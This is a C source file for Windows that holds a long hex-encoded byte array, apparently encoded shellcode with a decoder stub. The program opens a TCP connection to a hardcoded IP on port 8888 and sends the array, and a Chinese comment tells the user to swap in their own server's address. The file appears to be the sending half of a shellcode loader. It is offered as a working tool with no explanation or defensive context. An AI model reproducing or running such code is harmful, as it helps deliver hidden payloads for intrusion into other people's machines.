#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>
#include<WS2tcpip.h>
#define WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib,"ws2_32.lib")
char buf[] = "\xba\x07\x66\x69\xfa\xdb\xd8\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x78\x31\x53\x12\x03\x53\x12\x83\xc4\x62\x8b\x0f\x13\xad\x92\x84\x87\xc6\x98\xf3\x89\xbe\xb8\xa1\x26\x76\x8f\x27\x79\xe2\xe8\x44\xbb\xf6\x0b\x21\xb9\x5b\x66\x37\xf6\x4a\x83\x26\x77\x3c\xff\x99\x4b\x4c\xd6\xcd\xa8\x7b\x55\xd7\xe8\x49\x0d\x0c\xb5\x74\x23\x8e\x2e\xc1\x36\x12\x38\x91\x89\x0e\xcf\x43\x49\x8a\x9a\x48\x59\xa8\x20\x7b\x95\x62\xf9\xd1\x88\xde\x70\x17\xbf\xef\xbe\x54\x90\x03\x27\x67\x26\xd3\x34\xdd\x49\x01\xf2\x70\x31\x4c\x29\xd6\xaf\xb3\xfc\x3a\x87\x11\x52\x04\x89\xd6\x7a\x6f\x8b\x40\xa2\x58\x53\xfe\x0b\xc4\xe2\xf0\x8c\x13\x1c\x95\xfb\x13\x6f\x77\x33\xec\x0a\xaf\x49\x81\x7d\xb0\xf5\xe1\xfe\xad\x85\xa3\x81\x33\x95\x0c\xf6\xd2\xa5\x1b\xe6\xb1\xa3\xfc\x9a\xe6\x26\x63\xa9\x29\x3e\xc6\x64\xa2\xe9\x22\xba\x03\xc2\xdc\xe4\x2a\x73\x64\xef\x83\xc6\x90\x70\x36\xe9\x4a\x37\x99\x3b\xe3\xea\x8d\xc7\x15\x42\xe5\x99\xec\xe3\xbe\x2e\x19\x8f\xc5\x2b\x97\xe3\xda\x5b\x5e\x50\x7d\x25\x41\x2b\x5b\xdf\x9d\xd2\xf9\xd4\x79\xee\x9a\x02\x48\x2f\x26\x45\x77\x2c\xf3\xc9\xf9\x39\x4d\xb4\x06\xab\x39\xad\xab\xab\x6c\xd9\xba\xfd\xae\x6c\xb1\x9d\xec\x96\xe0\x4b\x10\x0b\xab\xc5\x47\xc4\xe2\xa0\x9c\x96\xe7\x96\xaf\x32\xdf\x81\xb1\x5f\x1c\x07\xd6\xa0\xbd\xfa\x62\x4a\xe4\x5d\xf7\x50\x68\x39\xba\x9f\x7a\x23\x4b\x43\x3b\xdd\x5e\x4e\x7a\x1b\xac\x41\xd8\x9e\x41\xf7\x7c\x5f\x08\x27\xb8\x4f\xf7\xf2\xca\x5e\xd5\xdd\x63\x5c\xfe\x31\x01\x02\x0a\x36\xb1\x43\x89\xd2\x75\x40\x08\x26\x56\x69\x4b\xce\x44\x5c\x2a\xe8\xef\x41\x05\xb1\xd5\x32\xdb\xdf\x58\x6b\xf7\xaa\xb4\xdc\x21\x63\x6d\x2f\x5b\x64\x7e\x02\x81\x6c\x6c\x01\x4d\xfb\x94\x5e\x74\xa3\xaa\x20\xf2\x9f\x28\xc2\x1d\xb7\xd2\x94\x5d\x1c\x63\xad\x7b\xf0\x78\x6e\x1d\x44\xdc\x01\x7c\xc2\xeb\x82\x2f\x66\x5d\x8c\x7a\xd0\x2e\xce\xd0\xe0\x7a\xdb\x53\x4c\xd2\xb4\x30\x29\xb7\x18\xd5\x66\x4c\xc7\x6e\xc9\x04\x5e\x34\xae\xa4\x0f\x4f\x9a\x86\x86\x86\xca\x6d\x28\x30\x80\xdd\x04\x99\x7f\xe1\x9a\xd5\x33\xec\xc1\xbf\x3c\x6a\xad\x2d\x3e\x48\xb6\x89\xac\x48\x63\xbe\xa8\xf6\x9e\x3d\x52\xd5\xcb\xcf\x42\x07\xe3\x55\xb2\x4d\x82\x46";


int wmain() {
    DWORD dwError;
    WORD sockVersion = MAKEWORD(2, 2);
    WSADATA wsaData;
    SOCKET socks;
    SHORT sListenPort = 8888;
    struct sockaddr_in sin;

    if (WSAStartup(sockVersion, &wsaData) != 0)
    {
        dwError = GetLastError();
        printf("[*]WSAStarup Error : %d \n", dwError);
        return dwError;
    }

    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (socks == INVALID_SOCKET)
    {
        dwError = GetLastError();
        printf("[*]Socket Error : %d \n", dwError);
        return dwError;
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(sListenPort);
    sin.sin_addr.S_un.S_addr = inet_addr("192.168.183.132");//这边换成你服务端的IP
    //InetPton(AF_INET, L"192.168.183.132", &sin.sin_addr.s_addr);

    if (connect(socks, (struct sockaddr*) & sin, sizeof(sin)) == SOCKET_ERROR)
    {
        dwError = GetLastError();
        printf("[*]Bind Error : %d \n", dwError);
        return dwError;
    }
    int ret = send(socks, buf, sizeof(buf), 0);

    if (ret > 0)
    {
        printf("[+]Send %d-Bytes \n", ret);
        closesocket(socks);
    }

    WSACleanup();
    return 0;
}